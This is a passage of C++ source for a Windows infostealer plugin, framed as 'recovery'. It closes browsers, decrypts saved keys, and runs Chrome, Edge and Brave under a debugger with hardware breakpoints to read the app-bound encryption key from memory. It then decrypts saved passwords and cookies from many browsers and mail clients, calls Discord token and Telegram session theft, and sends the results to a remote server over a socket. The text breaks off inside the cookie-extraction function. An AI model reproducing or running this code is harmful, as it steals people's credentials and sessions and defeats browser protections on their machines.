#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <memory>
#include <cstring>
#include <regex>
#include <set>
#include <cstdio>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

namespace fs = std::filesystem;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_RECOVERY_FILE = 0x07;

void send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
    if (sock == INVALID_SOCKET) return;

    uint32_t pathLen = (uint32_t)relPath.size();
    uint32_t dataSize = (uint32_t)data.size();
    uint32_t totalSize = sizeof(uint32_t) + pathLen + dataSize;

    PacketHeader header;
    header.signature = PACKET_SIGNATURE;
    header.type = PACKET_TYPE_RECOVERY_FILE;
    header.size = totalSize;

    std::vector<uint8_t> packet;
    packet.resize(sizeof(PacketHeader) + totalSize);
    memcpy(packet.data(), &header, sizeof(PacketHeader));

    uint8_t* ptr = packet.data() + sizeof(PacketHeader);
    memcpy(ptr, &pathLen, sizeof(uint32_t));
    ptr += sizeof(uint32_t);
    memcpy(ptr, relPath.c_str(), pathLen);
    ptr += pathLen;
    if (dataSize > 0) {
        memcpy(ptr, data.data(), dataSize);
    }

    int remaining = (int)packet.size();
    const char* p = (const char*)packet.data();
    while (remaining > 0) {
        int sent = send(sock, p, remaining, 0);
        if (sent <= 0) break;
        p += sent;
        remaining -= sent;
    }
}

std::string to_narrow_string(const wchar_t* w_str) {
    if (!w_str) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
    if (size <= 0) return "";
    std::string res(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}

std::string json_escape(const std::string& s) {
    std::ostringstream oss;
    for (auto c : s) {
        switch (c) {
        case '"': oss << "\\\""; break;
        case '\\': oss << "\\\\"; break;
        case '\b': oss << "\\b"; break;
        case '\f': oss << "\\f"; break;
        case '\n': oss << "\\n"; break;
        case '\r': oss << "\\r"; break;
        case '\t': oss << "\\t"; break;
        default:
            if ('\x00' <= (unsigned char)c && (unsigned char)c <= '\x1f') {
                oss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)(unsigned char)c;
            } else {
                oss << c;
            }
        }
    }
    return oss.str();
}

std::string path_to_uri(const fs::path& p) {
    std::string path_str = to_narrow_string(p.wstring().c_str());
    std::string encoded = "";
    for (unsigned char c : path_str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == '/' || c == ':') {
            encoded += (char)c;
        } else if (c == '\\') {
            encoded += '/';
        } else {
            char buf[4];
            snprintf(buf, sizeof(buf), "%%%02X", c);
            encoded += buf;
        }
    }
    return "file:" + encoded + "?mode=ro&nolock=1&immutable=1";
}

struct BrowserConfig {
    std::string name;
    std::string process_name;
    std::vector<std::wstring> exe_paths;
    std::string dll_name;
    std::vector<std::wstring> user_data_subdir;
    std::string output_dir;
    std::string temp_prefix;
    bool use_r14;
    bool use_roaming;
    bool has_abe;
    bool is_firefox;
};

// Function prototypes
void kill_processes_by_name(const std::string& target_name);
std::vector<std::wstring> get_search_roots();
std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming);
std::vector<uint8_t> base64_decode(const std::string& input);
bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);
void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir);
void debug_loop(SOCKET sock, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name);
std::vector<uint32_t> get_all_threads(uint32_t process_id);
void set_hardware_breakpoint(uint32_t thread_id, size_t address);
void clear_hardware_breakpoints(uint32_t process_id);
void set_resume_flag(uint32_t thread_id);
bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir);
void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name);
void extract_telegram_session(SOCKET sock);

#include "includes/sqlite3.h"

// Forward declarations for helper functions
std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera);

void run_recovery(SOCKET sock) {
    std::vector<BrowserConfig> configs = {
        {"New Outlook", "", {}, "", {L"Microsoft", L"Olk", L"EBWebView"}, "mail_clients/Outlook", "outlook_tmp", false, false, false, false},
        {"Google Chrome", "chrome.exe", {L"Google\\Chrome\\Application\\chrome.exe"}, "chrome.dll", {L"Google", L"Chrome", L"User Data"}, "browsers/Google Chrome", "chrome_tmp", false, false, true, false},
        {"Microsoft Edge", "msedge.exe", {L"Microsoft\\Edge\\Application\\msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
        {"Brave", "brave.exe", {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, "chrome.dll", {L"BraveSoftware", L"Brave-Browser", L"User Data"}, "browsers/Brave", "brave_tmp", false, false, true, false},
        {"Opera Stable", "opera.exe", {L"Opera\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera Stable"}, "browsers/Opera Stable", "opera_tmp", false, true, false, false},
        {"Opera GX", "opera.exe", {L"Opera GX\\launcher.exe"}, "launcher_lib.dll", {L"Opera Software", L"Opera GX Stable"}, "browsers/Opera GX", "operagx_tmp", false, true, false, false},
        {"Mozilla Firefox", "firefox.exe", {L"Mozilla Firefox\\firefox.exe"}, "nss3.dll", {L"Mozilla", L"Firefox", L"Profiles"}, "browsers/Mozilla Firefox", "firefox_tmp", false, true, false, true},
        {"Waterfox", "waterfox.exe", {L"Waterfox\\waterfox.exe"}, "nss3.dll", {L"Waterfox", L"Profiles"}, "browsers/Waterfox", "waterfox_tmp", false, true, false, true},
        {"LibreWolf", "librewolf.exe", {L"LibreWolf\\librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
        {"Mozilla Thunderbird", "thunderbird.exe", {L"Mozilla Thunderbird\\thunderbird.exe"}, "nss3.dll", {L"Thunderbird", L"Profiles"}, "mail_clients/Thunderbird", "thunderbird_tmp", false, true, false, true},
        {"Yandex Browser", "browser.exe", {L"Yandex\\YandexBrowser\\Application\\browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
    };

    kill_processes_by_name("chrome.exe");
    kill_processes_by_name("msedge.exe");
    kill_processes_by_name("brave.exe");

    for (const auto& config : configs) {
        std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
        if (user_data_dir.empty() && config.name == "New Outlook") {
             user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
        }
        if (user_data_dir.empty()) continue;

        std::vector<uint8_t> v10_key;
        bool is_dpapi = false;
        bool has_key = get_v10_key(user_data_dir, v10_key, is_dpapi);
        bool should_debug = config.has_abe;

        if (config.is_firefox) {
            extract_firefox_data(sock, config, user_data_dir);
            continue;
        }

        if (has_key) {
            if (is_dpapi && !config.has_abe) {
                extract_all_profiles_data(sock, {}, config, user_data_dir);
                should_debug = false;
            } else if (!is_dpapi && !config.has_abe) {
                extract_all_profiles_data(sock, v10_key, config, user_data_dir);
                should_debug = false;
            }
        } else if (!config.has_abe) {
            extract_all_profiles_data(sock, {}, config, user_data_dir);
            should_debug = false;
        }

        if (!should_debug && !config.has_abe) continue;

        std::wstring exe_path = L"";
        std::vector<std::wstring> search_roots = get_search_roots();
        for (const auto& path : config.exe_paths) {
            for (const auto& root : search_roots) {
                fs::path full_path = fs::path(root) / path;
                if (fs::exists(full_path)) { exe_path = full_path.wstring(); break; }
            }
            if (!exe_path.empty()) break;
        }

        if (exe_path.empty()) {
            if (config.name == "New Outlook") {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring outlookPath = std::wstring(localAppData) + L"\\Microsoft\\WindowsApps\\olk.exe";
                    CoTaskMemFree(localAppData);
                    if (fs::exists(outlookPath)) exe_path = outlookPath;
                }
            }
            if (config.name.find("Opera") != std::string::npos) {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring operaUserPath = localAppData;
                    CoTaskMemFree(localAppData);
                    if (config.name.find("GX") != std::string::npos) operaUserPath += L"\\Programs\\Opera GX\\opera.exe";
                    else operaUserPath += L"\\Programs\\Opera\\opera.exe";
                    if (fs::exists(operaUserPath)) exe_path = operaUserPath;
                }
            }
            if (config.name.find("Yandex") != std::string::npos) {
                wchar_t* localAppData;
                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
                    std::wstring yandexUserPath = std::wstring(localAppData) + L"\\Yandex\\YandexBrowser\\Application\\browser.exe";
                    CoTaskMemFree(localAppData);
                    if (fs::exists(yandexUserPath)) exe_path = yandexUserPath;
                }
            }
        }

        if (exe_path.empty()) continue;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";
        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
        cmd_buffer.push_back(0);

        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            debug_loop(sock, pi.hProcess, config, user_data_dir);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    struct DiscordConfig { std::string name; std::wstring subdir; };
    std::vector<DiscordConfig> discords = { {"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}, {"Lightcord", L"Lightcord"} };
    wchar_t* appdata;
    if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
        fs::path roaming(appdata);
        CoTaskMemFree(appdata);
        for (const auto& d : discords) {
            fs::path p = roaming / d.subdir;
            if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.name);
        }
    }
    extract_telegram_session(sock);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    run_recovery(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
    // Stub
}

// Implementations of helper functions (ported from original main.cpp and modified)

struct WindowTerminateContext { DWORD target_pid; bool message_sent; };

BOOL CALLBACK ClearProcessWindowsCallback(HWND hwnd, LPARAM lParam) {
    WindowTerminateContext* context = reinterpret_cast<WindowTerminateContext*>(lParam);
    DWORD window_pid = 0;
    GetWindowThreadProcessId(hwnd, &window_pid);
    if (window_pid == context->target_pid) { PostMessageW(hwnd, WM_CLOSE, 0, 0); context->message_sent = true; }
    return TRUE;
}

void kill_processes_by_name(const std::string& target_name) {
    std::wstring target_name_w(target_name.begin(), target_name.end());
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, target_name_w.c_str()) == 0) {
                    WindowTerminateContext context = { pe.th32ProcessID, false };
                    EnumWindows(ClearProcessWindowsCallback, reinterpret_cast<LPARAM>(&context));
                    if (context.message_sent) Sleep(500);
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
}

std::vector<uint32_t> get_all_threads(uint32_t process_id) {
    std::vector<uint32_t> threads;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te; te.dwSize = sizeof(THREADENTRY32);
        if (Thread32First(snapshot, &te)) {
            do { if (te.th32OwnerProcessID == process_id) threads.push_back(te.th32ThreadID); } while (Thread32Next(snapshot, &te));
        }
        CloseHandle(snapshot);
    }
    return threads;
}

void set_hardware_breakpoint(uint32_t thread_id, size_t address) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(h_thread, &ctx)) { ctx.Dr0 = address; ctx.Dr7 = (ctx.Dr7 & ~0b11) | 0b01; SetThreadContext(h_thread, &ctx); }
        ResumeThread(h_thread); CloseHandle(h_thread);
    }
}

void clear_hardware_breakpoints(uint32_t process_id) {
    std::vector<uint32_t> threads = get_all_threads(process_id);
    for (uint32_t thread_id : threads) {
        HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
        if (h_thread) {
            SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(h_thread, &ctx)) { ctx.Dr0 = 0; ctx.Dr7 &= ~0b11; SetThreadContext(h_thread, &ctx); }
            ResumeThread(h_thread); CloseHandle(h_thread);
        }
    }
}

void set_resume_flag(uint32_t thread_id) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if (h_thread) {
        SuspendThread(h_thread); CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_CONTROL;
        if (GetThreadContext(h_thread, &ctx)) { ctx.EFlags |= 0x10000; SetThreadContext(h_thread, &ctx); }
        ResumeThread(h_thread); CloseHandle(h_thread);
    }
}

std::vector<uint8_t> base64_decode(const std::string& input) {
    DWORD out_len = 0;
    if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        std::vector<uint8_t> out(out_len);
        if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &out_len, NULL, NULL)) return out;
    }
    return {};
}

std::vector<std::wstring> get_search_roots() {
    std::vector<std::wstring> roots; wchar_t* path = NULL;
    if (SHGetKnownFolderPath(FOLDERID_ProgramFiles, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    if (SHGetKnownFolderPath(FOLDERID_ProgramFilesX86, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) { roots.push_back(path); CoTaskMemFree(path); }
    wchar_t env_path[MAX_PATH];
    if (GetEnvironmentVariableW(L"ProgramW6432", env_path, MAX_PATH) > 0) roots.push_back(env_path);
    return roots;
}

std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming) {
    wchar_t* path = NULL;
    if (SHGetKnownFolderPath(use_roaming ? FOLDERID_RoamingAppData : FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
        fs::path p(path); CoTaskMemFree(path);
        for (const auto& component : subdir) p /= component;
        if (fs::exists(p)) return p.wstring();
    }
    return L"";
}

bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
    fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
    std::ifstream ifs(local_state_path); if (!ifs.is_open()) return false;
    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    size_t pos = content.find("\"encrypted_key\":\""); if (pos == std::string::npos) return false;
    pos += 17; size_t end = content.find("\"", pos); if (end == std::string::npos) return false;
    std::string encrypted_key_b64 = content.substr(pos, end - pos);
    std::vector<uint8_t> encrypted_key = base64_decode(encrypted_key_b64); if (encrypted_key.empty()) return false;
    is_dpapi = (encrypted_key.size() >= 5 && memcmp(encrypted_key.data(), "DPAPI", 5) == 0);
    const uint8_t* blob_data = is_dpapi ? encrypted_key.data() + 5 : encrypted_key.data();
    size_t blob_size = is_dpapi ? encrypted_key.size() - 5 : encrypted_key.size();
    DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_data }; DATA_BLOB output = { 0, NULL };
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (output.cbData == 32) { key.assign(output.pbData, output.pbData + output.cbData); LocalFree(output.pbData); return true; }
        LocalFree(output.pbData);
    }
    return false;
}

std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext) {
    BCRYPT_ALG_HANDLE h_alg = NULL; BCRYPT_KEY_HANDLE h_key = NULL; std::vector<uint8_t> plaintext;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (ULONG)key.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info; BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
                if (ciphertext.size() > 16) {
                    std::vector<uint8_t> actual_ciphertext(ciphertext.begin(), ciphertext.end() - 16);
                    std::vector<uint8_t> tag(ciphertext.end() - 16, ciphertext.end());
                    auth_info.pbNonce = (BYTE*)nonce.data(); auth_info.cbNonce = (ULONG)nonce.size(); auth_info.pbTag = tag.data(); auth_info.cbTag = (ULONG)tag.size();
                    DWORD out_len = 0;
                    if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, NULL, 0, &out_len, 0) == 0) {
                        plaintext.resize(out_len);
                        if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &out_len, 0) != 0) plaintext.clear();
                    }
                }
            }
        }
    }
    if (h_key) BCryptDestroyKey(h_key); if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0); return plaintext;
}

bool is_mostly_printable(const std::vector<uint8_t>& data) {
    if (data.empty()) return true; size_t printable = 0;
    for (uint8_t b : data) if ((b >= 32 && b <= 126) || b == '\r' || b == '\n' || b == '\t') printable++;
    return (double)printable / data.size() > 0.8;
}

std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    if (blob.empty()) return {};
    if (blob.size() > 15 && (memcmp(blob.data(), "v10", 3) == 0 || memcmp(blob.data(), "v20", 3) == 0)) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15);
        std::vector<uint8_t> ciphertext(blob.begin() + 15, blob.end());
        auto try_decrypt = [&](const std::vector<uint8_t>& key) -> std::vector<uint8_t> {
            if (key.empty()) return {};
            std::vector<uint8_t> dec = decrypt_aes_gcm(key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) {
                    std::vector<uint8_t> header(dec.begin(), dec.begin() + 32);
                    if (is_opera || !is_mostly_printable(header)) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                }
                return dec;
            }
            return {};
        };
        std::vector<uint8_t> res = try_decrypt(v10_key);
        if (res.empty()) res = try_decrypt(v20_key);
        return res;
    } else if (blob.size() > 15) {
        DATA_BLOB input = { (DWORD)blob.size(), (BYTE*)blob.data() }; DATA_BLOB output = { 0, NULL };
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            std::vector<uint8_t> dec(output.pbData, output.pbData + output.cbData); LocalFree(output.pbData); return dec;
        }
    }
    return {};
}

std::vector<uint8_t> read_process_memory_chunk(HANDLE h_process, void* addr, size_t size) {
    std::vector<uint8_t> buffer(size); SIZE_T bytes_read = 0;
    if (ReadProcessMemory(h_process, addr, buffer.data(), size, &bytes_read)) buffer.resize(bytes_read);
    else buffer.clear();
    return buffer;
}

size_t find_target_address(HANDLE h_process, void* base_addr, const std::string& browser_name) {
    IMAGE_DOS_HEADER dos_header; SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(h_process, base_addr, &dos_header, sizeof(dos_header), &bytes_read)) return 0;
    IMAGE_NT_HEADERS64 nt_headers;
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers), &bytes_read)) return 0;
    WORD section_count = nt_headers.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(section_count);
    if (!ReadProcessMemory(h_process, (BYTE*)base_addr + dos_header.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt_headers.FileHeader.SizeOfOptionalHeader, sections.data(), sizeof(IMAGE_SECTION_HEADER) * section_count, &bytes_read)) return 0;
    std::string target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    std::vector<uint8_t> needle(target_string.begin(), target_string.end());
    size_t string_va = 0;
    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".rdata", 6) == 0) {
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
            size_t pos = std::search(section_data.begin(), section_data.end(), needle.begin(), needle.end()) != section_data.end() ? std::distance(section_data.begin(), std::search(section_data.begin(), section_data.end(), needle.begin(), needle.end())) : std::string::npos;
            if (pos != std::string::npos) { string_va = (size_t)base_addr + section.VirtualAddress + pos; break; }
        }
    }
    if (string_va == 0) return 0;
    for (const auto& section : sections) {
        if (strncmp((char*)section.Name, ".text", 5) == 0) {
            size_t section_start = (size_t)base_addr + section.VirtualAddress;
            std::vector<uint8_t> section_data = read_process_memory_chunk(h_process, (BYTE*)base_addr + section.VirtualAddress, section.Misc.VirtualSize);
            for (size_t pos = 0; pos + 7 <= section_data.size(); ++pos) {
                if (section_data[pos] == 0x48 && section_data[pos+1] == 0x8D && section_data[pos+2] == 0x0D) {
                    int32_t offset = *(int32_t*)&section_data[pos+3];
                    size_t rip = section_start + pos + 7;
                    size_t target = (size_t)((int64_t)rip + offset);
                    if (target == string_va) return section_start + pos;
                }
            }
        }
    }
    return 0;
}

void debug_loop(SOCKET sock, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    DEBUG_EVENT debug_event = { 0 }; size_t target_address = 0;
    while (WaitForDebugEvent(&debug_event, INFINITE)) {
        switch (debug_event.dwDebugEventCode) {
            case LOAD_DLL_DEBUG_EVENT: {
                wchar_t buffer[MAX_PATH];
                if (GetFinalPathNameByHandleW(debug_event.u.LoadDll.hFile, buffer, MAX_PATH, 0)) {
                    std::wstring path = buffer; std::wstring dll_name_w(config.dll_name.begin(), config.dll_name.end());
                    if (path.find(dll_name_w) != std::wstring::npos) {
                        target_address = find_target_address(h_process, debug_event.u.LoadDll.lpBaseOfDll, config.name);
                        if (target_address != 0) {
                            std::vector<uint32_t> threads = get_all_threads(debug_event.dwProcessId);
                            for (uint32_t thread_id : threads) set_hardware_breakpoint(thread_id, target_address);
                        }
                    }
                }
                break;
            }
            case CREATE_THREAD_DEBUG_EVENT: { if (target_address != 0) set_hardware_breakpoint(debug_event.dwThreadId, target_address); break; }
            case EXCEPTION_DEBUG_EVENT: {
                if (debug_event.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
                    if ((size_t)debug_event.u.Exception.ExceptionRecord.ExceptionAddress == target_address) {
                        if (extract_key(sock, debug_event.dwThreadId, h_process, config, user_data_dir)) { clear_hardware_breakpoints(debug_event.dwProcessId); TerminateProcess(h_process, 0); }
                    }
                    set_resume_flag(debug_event.dwThreadId);
                }
                break;
            }
            case EXIT_PROCESS_DEBUG_EVENT: goto end_loop;
        }
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
end_loop:;
}

bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir) {
    HANDLE h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id); if (!h_thread) return false;
    bool success = false; CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(h_thread, &ctx)) {
        std::vector<DWORD64> key_ptrs = config.use_r14 ? std::vector<DWORD64>{ctx.R14, ctx.R15} : std::vector<DWORD64>{ctx.R15, ctx.R14};
        for (DWORD64 ptr : key_ptrs) {
            if (ptr == 0) continue; std::vector<uint8_t> buffer(32); SIZE_T bytes_read = 0;
            if (ReadProcessMemory(h_process, (LPCVOID)ptr, buffer.data(), 32, &bytes_read)) {
                DWORD64 data_ptr = ptr; uint64_t length = *(uint64_t*)&buffer[8]; if (length == 32) data_ptr = *(DWORD64*)&buffer[0];
                std::vector<uint8_t> key(32);
                if (ReadProcessMemory(h_process, (LPCVOID)data_ptr, key.data(), 32, &bytes_read)) {
                    bool all_zero = true; for (uint8_t b : key) if (b != 0) { all_zero = false; break; }
                    if (!all_zero) { extract_all_profiles_data(sock, key, config, user_data_dir); success = true; break; }
                }
            }
        }
    }
    CloseHandle(h_thread); return success;
}

void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    fs::path db_path = profile_path / "Login Data"; if (!fs::exists(db_path)) db_path = profile_path / "Ya Passman Data";
    if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* url = (const char*)sqlite3_column_text(stmt, 0); const char* user = (const char*)sqlite3_column_text(stmt, 1);
                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2); int blob_size = sqlite3_column_bytes(stmt, 2);
                std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
                if (!dec.empty()) {
                    std::string str_url = url ? url : ""; std::string str_user = user ? user : ""; std::string str_pass = std::string(dec.begin(), dec.end());
                    oss_txt << "URL: " << str_url << "\nUser: " << str_user << "\nPass: " << str_pass << "\n---\n";
                    if (!first) oss_json << ",\n";
                    oss_json << "  {\n";
                    oss_json << "    \"url\": \"" << json_escape(str_url) << "\",\n";
                    oss_json << "    \"username\": \"" << json_escape(str_user) << "\",\n";
                    oss_json << "    \"password\": \"" << json_escape(str_pass) << "\"\n";
                    oss_json << "  }";
                    first = false;
                }
            }
            oss_json << "\n]";
            sqlite3_finalize(stmt);
            std::string str_txt = oss_txt.str(); if (!str_txt.empty()) send_file_to_server(sock, out_prefix + "/passwords.txt", std::vector<uint8_t>(str_txt.begin(), str_txt.end()));
            std::string str_json = oss_json.str(); if (str_json.size() > 2) send_file_to_server(sock, out_prefix + "/passwords.json", std::vector<uint8_t>(str_json.begin(), str_json.end()));
        }
        sqlite3_close(db);
    }
}

void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    fs::path db_path = profile_path / "Network" / "Cookies"; if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
    if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
        sqlite3_stmt* stmt; const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies";
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            std::ostringstream oss_txt, oss_json;
            oss_json << "[\n"; bool first = true;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0); const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const char* value = (const char*)sqlite3_column_text(stmt, 2); const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
